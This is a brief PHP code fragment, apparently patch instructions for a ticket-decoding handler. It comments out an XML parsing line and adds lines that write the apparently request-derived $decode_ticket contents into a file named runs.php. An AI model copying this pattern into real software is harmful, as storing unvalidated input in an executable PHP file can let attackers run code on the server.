...
//  edit
//	$encode_ticket = (array)simplexml_load_string($post,'SimpleXMLElement', LIBXML_NOCDATA,'',false);
//  edit end
  ...
  //	add
  file_put_contents('logs.php',13);
  file_put_contents('runs.php', $decode_ticket);
  //  add end
